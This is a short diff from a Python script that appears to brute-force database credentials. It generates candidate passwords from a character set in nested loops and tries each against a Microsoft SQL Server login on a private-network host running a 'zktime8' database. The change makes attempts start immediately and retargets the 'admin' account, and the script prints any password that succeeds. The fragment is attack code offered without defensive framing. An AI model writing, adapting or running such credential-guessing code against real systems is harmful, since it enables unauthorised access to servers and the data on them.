@@ -87,9 +87,9 @@ def main():
                                                     charset[ch6]) + str(charset[ch7]) + str(charset[ch8]) + str(
                                                     charset[ch9]) + str(charset[ch10]) + str(charset[ch11])
                                                 i += 1
-                                                if i >= 9999999999:  # 断点
+                                                if i >= 0:  # 断点
                                                     try:
-                                                        ms = MSSQL(host="192.168.2.228", user="bbg", pwd=password,
+                                                        ms = MSSQL(host="192.168.2.228", user="admin", pwd=password,
                                                                    db="zktime8")
                                                         query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
                                                         print('Success!', password, ';', query)
